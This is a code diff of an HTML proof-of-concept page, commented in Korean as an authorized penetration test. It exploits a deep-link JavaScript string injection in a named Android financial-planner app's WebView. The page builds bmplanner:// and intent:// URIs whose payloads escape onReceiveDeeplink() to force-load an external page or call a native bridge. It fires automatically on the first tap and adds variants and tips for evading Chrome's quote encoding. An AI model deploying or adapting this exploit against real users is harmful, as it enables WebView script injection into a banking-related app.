@@ -6,33 +6,41 @@
   <title>모의해킹 테스트 - DeepLink Injection</title>
   <style>
     body { font-family: Arial, sans-serif; background:#f2f2f2; margin:0; padding:20px; }
-    h1 { color:#333; font-size:20px; }
-    .desc { color:#666; font-size:13px; margin-bottom:16px; }
-    button { display:block; width:100%; box-sizing:border-box; margin:8px 0; padding:14px;
-             font-size:15px; border:none; border-radius:8px; color:#fff; background:#c0392b; }
+    h1 { color:#333; font-size:19px; }
+    .desc { color:#666; font-size:13px; margin-bottom:14px; }
+    .sec { color:#333; font-size:13px; font-weight:bold; margin:14px 0 4px; }
+    button { display:block; width:100%; box-sizing:border-box; margin:6px 0; padding:13px;
+             font-size:14px; border:none; border-radius:8px; color:#fff; background:#c0392b; }
+    button.rec { background:#8e0000; }
     button.alt { background:#2c3e50; }
     button.safe { background:#27ae60; }
-    #log { margin-top:16px; padding:12px; background:#111; color:#0f0; font-size:11px;
-           border-radius:8px; white-space:pre-wrap; word-break:break-all; min-height:70px; }
-    .hint { color:#999; font-size:11px; margin-top:8px; }
-    .cfg { color:#999; font-size:11px; }
+    #log { margin-top:14px; padding:12px; background:#111; color:#0f0; font-size:11px;
+           border-radius:8px; white-space:pre-wrap; word-break:break-all; min-height:80px; }
+    .hint { color:#999; font-size:11px; margin-top:8px; line-height:1.5; }
+    .cfg { color:#999; font-size:11px; margin-top:6px; }
   </style>
 </head>
 <body>
-  <!-- 승인된 모의해킹(전자금융 모바일) 진단용 PoC. bmplanner DeepLink -> DeeplinkTool -> onReceiveDeeplink() 의
-       evaluateJavascript 문자열 인젝션 검증. 무단 사용 금지. -->
-  <h1>모의해킹 테스트용 페이지 (DeepLink Injection)</h1>
-  <div class="desc">빈 화면을 한 번 탭하면 <b>기본 공격(①)</b>이 자동 실행됩니다. 아래 버튼으로 변형별 테스트도 가능합니다.</div>
+  <!-- 승인된 모의해킹(전자금융 모바일) 진단용 PoC. bmplanner DeepLink -> DeeplinkTool.onReceiveDeeplink()
+       의 evaluateJavascript 문자열 인젝션 검증. 무단 사용 금지. -->
+  <h1>모의해킹 - DeepLink Injection PoC</h1>
+  <div class="desc">빈 화면 탭 = 추천 변형 자동 실행. cold start면 실행 후 <b>홈 → 재진입</b> 해야 터집니다.</div>
 
-  <button onclick="ev(event,'direct','page')">① 직접 스킴 · 내 페이지 로드</button>
-  <button class="alt" onclick="ev(event,'intent','page')">② intent 래퍼 · 내 페이지 로드</button>
-  <button class="safe" onclick="ev(event,'direct','toast')">③ 직접 스킴 · toast 증명(비이동)</button>
-  <button class="safe alt" onclick="ev(event,'intent','toast')">④ intent 래퍼 · toast 증명(비이동)</button>
+  <div class="sec">A. 내 페이지 강제 로드</div>
+  <button class="rec" onclick="ev(event,'direct','path','page')">① 직접스킴·PATH (추천)</button>
+  <button onclick="ev(event,'direct','query','page')">② 직접스킴·QUERY</button>
+  <button class="alt" onclick="ev(event,'intent','path','page')">③ intent래퍼·PATH</button>
+  <button class="alt" onclick="ev(event,'intent','query','page')">④ intent래퍼·QUERY</button>
+
+  <div class="sec">B. toast 증명 (앱에 머무름 · 진단용)</div>
+  <button class="safe" onclick="ev(event,'direct','path','toast')">⑤ 직접스킴·PATH · toast</button>
+  <button class="safe alt" onclick="ev(event,'intent','path','toast')">⑥ intent래퍼·PATH · toast</button>
 
   <div id="log">[log] 대기 중…</div>
   <div class="hint">
-    성공 판정: ①·② → 내 페이지(test1.html)로 이동 / ③·④ → 도메인 담긴 toast 표시.<br>
-    Chrome이 따옴표를 인코딩해 직접 스킴이 안 먹히면 intent 래퍼(②·④)를 시도하세요.
+    판정: ①~④ → test1.html로 이동 / ⑤~⑥ → 도메인 담긴 toast.<br>
+    <b>토스트가 뜨는 변형 = 그 기기 Chrome에서 따옴표가 살아남은 전달방식</b>입니다. 그 변형으로 A(페이지 로드)를 쓰세요.<br>
+    전부 실패 시 <code>chrome://inspect</code>로 앱 웹뷰 콘솔의 실제 <code>onReceiveDeeplink('…')</code> 문자열을 확인하면 인코딩 여부가 바로 보입니다.
   </div>
   <div class="cfg" id="cfg"></div>
 
@@ -41,7 +49,6 @@
     var TARGET = "https://fpdh0104.github.io/testhub/test1.html"; // 이동시킬 내 페이지
     var PKG    = "kr.co.bomapp.planner";     // 운영 설치본. 스테이징이면 kr.co.bomapp.planner.stg
     // ================
-
     document.getElementById('cfg').textContent = "target=" + TARGET + " / package=" + PKG;
 
     function log(m){
@@ -49,39 +56,35 @@
       el.textContent = "[log] " + m + "\n" + el.textContent;
     }
 
-    // onReceiveDeeplink('<여기>') 의 JS 문자열을 탈출시키는 페이로드 (앞뒤 따옴표 균형 유지)
-    function payload(kind){
-      if (kind === 'toast'){
-        return "'+androidNative.toast(document.domain,'short')+'";
-      }
-      // 기본: 내 페이지 강제 로드
-      return "'+window.location.assign('" + TARGET + "')+'";
-    }
+    // onReceiveDeeplink('<여기>') 의 JS 문자열을 탈출시키는 페이로드 (앞뒤 따옴표 균형)
+    function pageP(){  return "'+window.location.assign('" + TARGET + "')+'"; }
+    function toastP(){ return "'+androidNative.toast(document.domain,'short')+'"; }
 
-    function buildUri(mode, kind){
-      var p = payload(kind);
+    function buildUri(mode, place, kind){
+      var p = (kind === 'toast') ? toastP() : pageP();
+      // place: 따옴표가 인코딩 안 되는 path 우선, query는 인코딩될 수 있음
+      var body = (place === 'path') ? ("app/" + p) : ("app?x=" + p);
       if (mode === 'intent'){
-        return "intent://app?x=" + p + "#Intent;scheme=bmplanner;package=" + PKG + ";end";
+        return "intent://" + body + "#Intent;scheme=bmplanner;package=" + PKG + ";end";
       }
-      // direct custom scheme
-      return "bmplanner://app?x=" + p;
+      return "bmplanner://" + body;   // direct custom scheme
     }
 
-    function fire(mode, kind){
-      var uri = buildUri(mode, kind);
-      log("발사(" + mode + "/" + kind + "): " + uri);
-      // 살짝 지연 — 로그가 보이도록
-      setTimeout(function(){ window.location.href = uri; }, 120);
+    function fire(mode, place, kind){
+      var uri = buildUri(mode, place, kind);
+      log("발사 [" + mode + "/" + place + "/" + kind + "]\n" + uri);
+      setTimeout(function(){ window.location.href = uri; }, 150);
     }
 
-    // 버튼용: 배경 자동발사와 겹치지 않게 전파 차단
-    function ev(e, mode, kind){
+    var fired = false;
+    function ev(e, mode, place, kind){
+      fired = true;                       // 버튼 탭 시 배경 자동발사 방지
       if (e && e.stopPropagation) e.stopPropagation();
-      fire(mode, kind);
+      fire(mode, place, kind);
     }
 
-    // 빈 화면 첫 탭/클릭 -> 기본 공격 자동 실행
-    function auto(){ fire('direct','page'); }
+    // 빈 화면 첫 탭/클릭 -> 추천 변형(직접스킴·PATH·페이지) 자동 실행
+    function auto(){ if (fired) return; fired = true; fire('direct','path','page'); }
     document.addEventListener('click', auto, { once:true });
     document.addEventListener('touchstart', auto, { once:true });
   </script>
